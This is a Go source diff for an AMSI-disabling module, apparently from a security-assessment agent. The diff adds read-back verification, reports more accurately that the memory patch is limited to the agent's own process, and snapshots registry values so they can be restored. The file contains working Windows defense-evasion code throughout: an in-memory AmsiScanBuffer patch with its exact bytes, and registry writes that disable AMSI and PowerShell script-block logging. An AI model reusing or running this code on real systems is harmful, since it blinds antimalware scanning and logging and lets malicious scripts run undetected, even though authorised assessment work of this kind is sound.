@@ -1,3 +1,5 @@
+//go:build windows
+
 package modules
 
 import (
@@ -30,11 +32,16 @@ func (m *disableAMSIModule) Run() RawResult {
 	disabledCount := 0
 	var details []string
 
-	// Technique 1: Try to patch AmsiScanBuffer in memory (classic AMSI bypass)
+	// Technique 1: Try to patch AmsiScanBuffer in memory (classic AMSI bypass).
+	//
+	// NOTE: this patches amsi.dll *inside the agent's own process only*. The
+	// patch is discarded when the agent exits, and it has no effect on AMSI in
+	// PowerShell or any other process. It is weak evidence of AMSI tampering,
+	// so it is reported separately from the registry change rather than being
+	// counted as a successful system-wide AMSI disable.
 	if m.patchAMSIInMemory() {
-		disabledCount++
-		details = append(details, "AMSI memory patch successful (AmsiScanBuffer patched)")
-		m.logger.Info("AMSI memory patch successful", nil)
+		details = append(details, "AmsiScanBuffer patched in the agent process only (in-memory, reverted when the agent exits; no effect on other processes)")
+		m.logger.Info("AMSI memory patch applied (agent process only)", nil)
 	} else {
 		m.logger.Debug("AMSI memory patch failed", nil)
 	}
@@ -101,7 +108,7 @@ func (m *disableAMSIModule) patchAMSIInMemory() bool {
 	// Patch: mov eax, 1; ret  (returns AMSI_RESULT_NOT_DETECTED = 1)
 	// x64: B8 01 00 00 00 C3
 	patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}
-	
+
 	// Write the patch
 	err = windows.WriteProcessMemory(
 		windows.CurrentProcess(),
@@ -119,8 +126,33 @@ func (m *disableAMSIModule) patchAMSIInMemory() bool {
 	// Restore protection
 	windows.VirtualProtect(proc, 8, oldProtect, &oldProtect)
 
-	// Verify patch worked by calling AmsiScanBuffer
-	// (This would need a proper test but we assume it worked if we got here)
+	// Verify the patch actually landed by reading the bytes back, rather than
+	// assuming success because the write did not error. Without this the
+	// module reported "AMSI memory patch successful" on a patch that may
+	// never have been applied.
+	buf := make([]byte, len(patch))
+	if err := windows.ReadProcessMemory(
+		windows.CurrentProcess(),
+		uintptr(proc),
+		(*byte)(unsafe.Pointer(&buf[0])),
+		uintptr(len(buf)),
+		nil,
+	); err != nil {
+		m.logger.Debug("Failed to read back AMSI patch", map[string]interface{}{"error": err.Error()})
+		return false
+	}
+
+	applied := true
+	for i := range patch {
+		if buf[i] != patch[i] {
+			applied = false
+			break
+		}
+	}
+	if !applied {
+		m.logger.Debug("AMSI patch bytes did not match after write", nil)
+		return false
+	}
 	return true
 }
 
@@ -137,6 +169,11 @@ func (m *disableAMSIModule) disableAMSIRegistry() bool {
 		}
 	}
 	defer k.Close()
+
+	// Snapshot both values before writing: an assessment that disables AMSI
+	// and never re-enables it leaves PowerShell permanently unscripted.
+	snapshotDWORD(keyPath, "AMSIEnabled")
+	snapshotDWORD(keyPath, "ScriptBlockLoggingEnabled")
 
 	// Set AMSI disabled for PowerShell
 	err = k.SetDWordValue("AMSIEnabled", 0)
@@ -186,4 +223,3 @@ func (m *disableAMSIModule) unloadAMSIDLL() bool {
 	)
 	return err != nil // Error means it's unloaded
 }
-
